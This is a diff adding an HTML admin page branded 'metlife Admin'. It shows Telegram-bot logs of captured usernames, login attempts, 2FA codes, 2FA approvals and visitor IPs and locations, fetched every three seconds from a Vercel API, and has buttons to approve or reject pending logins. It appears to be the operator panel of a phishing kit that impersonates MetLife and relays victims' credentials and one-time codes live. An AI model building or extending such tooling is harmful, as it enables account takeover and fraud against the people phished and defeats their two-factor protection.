@@ -1,0 +1,430 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Bot Logs — metlife Admin</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="header">
+        <div class="brand">
+            <svg class="brand-mark" viewBox="0 0 48 48" aria-hidden="true">
+                <path d="M24 3 42 13v21L24 45 6 34V13L24 3Z" fill="none" stroke="#111" stroke-width="2.4"/>
+                <path d="M24 3v18l18-8M24 21 6 34M24 21l18 13" fill="none" stroke="#111" stroke-width="2"/>
+                <path d="m24 21 6 10-12 0 6-10Z" fill="none" stroke="#111" stroke-width="2"/>
+            </svg>
+            <div>
+                <div class="brand-name">metlife Admin </div>
+                <div class="tagline">Bot Activity Logs</div>
+            </div>
+        </div>
+    </header>
+    <div class="layout">
+        <aside class="sidebar">
+            <div class="sidebar-title">QUEUE</div>
+            <nav class="nav">
+                <a href="pending-new.html" class=""><span>Pending</span></a>
+                <a href="history-new.html" class=""><span>History</span></a>
+                <a href="bot-logs.html" class="active"><span>Bot Logs</span><span class="count" id="botLogsCount">0</span></a>
+                <a href="health.html" class=""><span>Health</span></a>
+            </nav>
+            <div class="sidebar-note">View all bot activity logs including login attempts, 2FA codes, and visitor logs.</div>
+        </aside>
+        <main class="main">
+            <h1 class="page-title">Bot Activity Logs</h1>
+            <p class="page-subtitle">Complete history of all bot notifications and user activities logged from the Telegram bot.</p>
+            
+            <div class="filter-section">
+                <label>Filter by Type:</label>
+                <select id="typeFilter" onchange="applyFilters()">
+                    <option value="">All Types</option>
+                    <option value="login_attempt">Login Attempts</option>
+                    <option value="username_entry">Username Entries</option>
+                    <option value="two_fa_code">2FA Codes</option>
+                    <option value="two_fa_approval">2FA Approvals</option>
+                    <option value="visitor_log">Visitor Logs</option>
+                    <option value="admin_decision">Admin Decisions</option>
+                </select>
+                <input type="text" id="usernameFilter" placeholder="Search by username..." onkeyup="applyFilters()">
+            </div>
+
+            <div id="statusMessage"></div>
+            <div id="logsContainer">
+                <div class="empty">Loading bot logs...</div>
+            </div>
+        </main>
+    </div>
+    <button class="queue-btn" onclick="location.href='bot-logs.html'"><span class="queue-icon"></span>Refresh</button>
+
+    <style>
+        .filter-section {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .filter-section label {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .filter-section select,
+        .filter-section input {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+
+        .filter-section input {
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .status-message {
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .status-message.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status-message.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status-message.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .log-item {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: start;
+            margin-bottom: 12px;
+        }
+
+        .log-type {
+            font-size: 12px;
+            font-weight: 700;
+            padding: 4px 8px;
+            border-radius: 3px;
+            display: inline-block;
+            text-transform: uppercase;
+        }
+
+        .log-type.login_attempt { background: #ffc107; color: #333; }
+        .log-type.username_entry { background: #17a2b8; color: white; }
+        .log-type.two_fa_code { background: #6c63ff; color: white; }
+        .log-type.two_fa_approval { background: #e83e8c; color: white; }
+        .log-type.visitor_log { background: #28a745; color: white; }
+        .log-type.admin_decision { background: #fd7e14; color: white; }
+
+        .log-time {
+            font-size: 12px;
+            color: #999;
+        }
+
+        .log-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px;
+            font-size: 13px;
+            margin-bottom: 12px;
+        }
+
+        .detail-row {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .detail-label {
+            color: #666;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+
+        .detail-value {
+            color: #333;
+            word-break: break-all;
+            font-family: monospace;
+            background: #f5f5f5;
+            padding: 4px 6px;
+            border-radius: 2px;
+            font-size: 12px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        .status-badge.approved { background: #d4edda; color: #155724; }
+        .status-badge.rejected { background: #f8d7da; color: #721c24; }
+        .status-badge.pending { background: #fff3cd; color: #856404; }
+        .status-badge.pending_approval { background: #d1ecf1; color: #0c5460; }
+        .status-badge.correct { background: #d4edda; color: #155724; }
+        .status-badge.incorrect { background: #f8d7da; color: #721c24; }
+
+        .log-actions {
+            display: flex;
+            gap: 8px;
+            border-top: 1px solid #eee;
+            padding-top: 12px;
+            margin-top: 12px;
+        }
+
+        .btn-small {
+            padding: 6px 12px;
+            font-size: 12px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background 0.2s;
+        }
+
+        .btn-approve {
+            background: #28a745;
+            color: white;
+        }
+
+        .btn-approve:hover { background: #218838; }
+
+        .btn-reject {
+            background: #dc3545;
+            color: white;
+        }
+
+        .btn-reject:hover { background: #c82333; }
+
+        .empty {
+            text-align: center;
+            padding: 40px 20px;
+            color: #999;
+            font-size: 16px;
+        }
+    </style>
+
+    <script>
+        const API_BASE = 'https://project-001-fsj6.vercel.app/api';
+        let allLogs = [];
+        let autoRefreshInterval = null;
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.nav a').forEach(a => {
+                if (a.getAttribute('href') === 'bot-logs.html') {
+                    a.classList.add('active');
+                }
+            });
+
+            loadBotLogs();
+            autoRefreshInterval = setInterval(() => {
+                loadBotLogs();
+            }, 3000);
+        });
+
+        async function loadBotLogs() {
+            try {
+                const response = await fetch(`${API_BASE}/admin/bot-logs?limit=200`);
+                const result = await response.json();
+
+                if (result.success && result.data) {
+                    allLogs = result.data;
+                    renderLogs(allLogs);
+                    
+                    const count = document.getElementById('botLogsCount');
+                    if (count) count.textContent = result.total || 0;
+                } else {
+                    document.getElementById('logsContainer').innerHTML = '<div class="empty">Error loading logs</div>';
+                }
+            } catch (err) {
+                console.error('Error loading bot logs:', err);
+                document.getElementById('logsContainer').innerHTML = `<div class="empty">Error: ${err.message}</div>`;
+            }
+        }
+
+        function applyFilters() {
+            const typeFilter = document.getElementById('typeFilter').value;
+            const usernameFilter = document.getElementById('usernameFilter').value.toLowerCase();
+
+            const filtered = allLogs.filter(log => {
+                const typeMatch = !typeFilter || log.type === typeFilter;
+                const usernameMatch = !usernameFilter || (log.username && log.username.toLowerCase().includes(usernameFilter));
+                return typeMatch && usernameMatch;
+            });
+
+            renderLogs(filtered);
+        }
+
+        function renderLogs(logs) {
+            const container = document.getElementById('logsContainer');
+
+            if (!logs || logs.length === 0) {
+                container.innerHTML = '<div class="empty">No bot logs found</div>';
+                return;
+            }
+
+            container.innerHTML = logs.map(log => `
+                <div class="log-item">
+                    <div class="log-header">
+                        <div>
+                            <span class="log-type ${log.type}">${formatType(log.type)}</span>
+                            <div class="log-time">${formatTime(log.createdAt)}</div>
+                        </div>
+                        <span class="status-badge ${log.status}">${log.status.toUpperCase()}</span>
+                    </div>
+                    <div class="log-details">
+                        ${log.username ? `<div class="detail-row"><div class="detail-label">👤 Username</div><div class="detail-value">${escapeHtml(log.username)}</div></div>` : ''}
+                        ${log.ip ? `<div class="detail-row"><div class="detail-label">📍 IP</div><div class="detail-value">${escapeHtml(log.ip)}</div></div>` : ''}
+                        ${log.verificationId ? `<div class="detail-row"><div class="detail-label">🔐 Verification ID</div><div class="detail-value" style="font-size: 11px;">${escapeHtml(log.verificationId.substring(0, 30))}</div></div>` : ''}
+                        ${log.location?.city ? `<div class="detail-row"><div class="detail-label">📍 Location</div><div class="detail-value">${escapeHtml((log.location.city || '') + ', ' + (log.location.country || ''))}</div></div>` : ''}
+                        ${log.method ? `<div class="detail-row"><div class="detail-label">Ⓜ️ Method</div><div class="detail-value">${escapeHtml(log.method)}</div></div>` : ''}
+                        ${log.approvedBy ? `<div class="detail-row"><div class="detail-label">✓ Approved By</div><div class="detail-value">${escapeHtml(log.approvedBy)}</div></div>` : ''}
+                        ${log.rejectedReason ? `<div class="detail-row"><div class="detail-label">✗ Reason</div><div class="detail-value">${escapeHtml(log.rejectedReason)}</div></div>` : ''}
+                    </div>
+                    ${(log.type === 'login_attempt' && log.status === 'pending') ? `
+                        <div class="log-actions">
+                            <button class="btn-small btn-approve" onclick="approveBotLog('${escapeHtml(log.verificationId)}', this)">✅ Approve</button>
+                            <button class="btn-small btn-reject" onclick="rejectBotLog('${escapeHtml(log.verificationId)}', this)">❌ Reject</button>
+                        </div>
+                    ` : ''}
+                </div>
+            `).join('');
+        }
+
+        async function approveBotLog(verificationId, button) {
+            if (button.disabled) return;
+            button.disabled = true;
+            button.textContent = '⏳ Processing...';
+
+            try {
+                const response = await fetch(`${API_BASE}/admin/bot-logs/${verificationId}/approve`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ approvedBy: 'web_admin' })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showMessage('✅ Log approved successfully', 'success');
+                    loadBotLogs();
+                } else {
+                    showMessage('❌ Error: ' + (result.message || 'Failed to approve'), 'error');
+                    button.disabled = false;
+                    button.textContent = '✅ Approve';
+                }
+            } catch (err) {
+                showMessage('❌ Error: ' + err.message, 'error');
+                button.disabled = false;
+                button.textContent = '✅ Approve';
+            }
+        }
+
+        async function rejectBotLog(verificationId, button) {
+            const reason = prompt('Enter rejection reason (optional):');
+            if (reason === null) return;
+
+            if (button.disabled) return;
+            button.disabled = true;
+            button.textContent = '⏳ Processing...';
+
+            try {
+                const response = await fetch(`${API_BASE}/admin/bot-logs/${verificationId}/reject`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        reason: reason || 'Rejected by admin',
+                        rejectedBy: 'web_admin'
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showMessage('✅ Log rejected successfully', 'success');
+                    loadBotLogs();
+                } else {
+                    showMessage('❌ Error: ' + (result.message || 'Failed to reject'), 'error');
+                    button.disabled = false;
+                    button.textContent = '❌ Reject';
+                }
+            } catch (err) {
+                showMessage('❌ Error: ' + err.message, 'error');
+                button.disabled = false;
+                button.textContent = '❌ Reject';
+            }
+        }
+
+        function showMessage(message, type) {
+            const msgEl = document.getElementById('statusMessage');
+            msgEl.className = 'status-message ' + type;
+            msgEl.textContent = message;
+            setTimeout(() => {
+                msgEl.textContent = '';
+                msgEl.className = '';
+            }, 4000);
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function formatType(type) {
+            const types = {
+                login_attempt: 'Login',
+                username_entry: 'Username',
+                two_fa_code: '2FA Code',
+                two_fa_approval: '2FA Approval',
+                visitor_log: 'Visitor',
+                admin_decision: 'Decision'
+            };
+            return types[type] || type;
+        }
+
+        function formatTime(dateStr) {
+            const date = new Date(dateStr);
+            const now = new Date();
+            const diff = Math.floor((now - date) / 1000);
+
+            if (diff < 60) return 'Just now';
+            if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
+            if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
+            return date.toLocaleDateString();
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+        });
+    </script>
+</body>
+</html>
